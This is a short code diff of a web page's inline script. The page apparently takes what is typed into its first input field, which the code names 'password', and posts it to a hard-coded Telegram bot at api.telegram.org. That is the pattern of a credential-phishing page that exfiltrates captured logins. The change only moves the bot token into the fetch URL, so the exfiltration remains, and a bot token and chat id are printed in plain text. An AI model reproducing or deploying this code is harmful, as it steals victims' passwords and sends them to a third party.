@@ -24,7 +24,6 @@
         </div>
         <script>
              const last=0
-            const telegramToken = '7936726979:AAGTZolWOLE01klHq8vkqfRqp0GBsG7-v3o';
             const chatId = '222606449';
             const password=document.getElementsByTagName("input")[0]
             const sendform=document.getElementsByTagName("form")[0]
@@ -47,7 +46,7 @@
             async function sendNumber(){
 
                 try {
-                    const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    const response = await fetch(`https://api.telegram.org/bot7936726979:AAGTZolWOLE01klHq8vkqfRqp0GBsG7-v3o/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
